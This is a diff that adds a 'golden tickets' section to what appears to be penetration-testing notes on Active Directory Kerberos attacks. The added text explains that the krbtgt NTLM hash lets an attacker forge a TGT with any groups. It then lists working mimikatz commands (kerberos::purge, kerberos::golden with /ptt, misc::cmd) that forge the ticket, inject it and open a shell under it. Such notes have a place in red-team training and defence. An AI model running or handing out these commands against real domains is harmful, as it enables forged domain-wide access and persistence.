@@ -53,6 +53,18 @@ mimikatz # kerberos::ptt 'C:\ticket.kirbi'
 
 **GOLDEN TICKETS:**
 
+With golden tickets, we can create TGTs for any domain resource that we want, and stating the groups we want. However to execute this attack we need the "krbtgt" domain account NTLM hash/password. Note that this attack is mostly used when you are already Domain Admin rather than trying to become one.
+
+Now, armed with the "krbtgt" NTLM hash, we can proceed and craft our golden ticket with mimikatz:
+
+```
+mimikatz # kerberos::purge
+
+mimikatz # kerberos::golden /user:trike /domain:contoso.com /sid:<our_sid_without_the_rid_part> /krbtgt:<ntlm_hash_of_krbtgt> /ptt
+(mimikatz by default will assing us the RID of 500, however we can set a custom one via the "/id" parameter)
+
+mimikatz # misc::cmd -> launcing a new cmd with our new TGT
+```
 
 **SILVER TICKETS:**
 
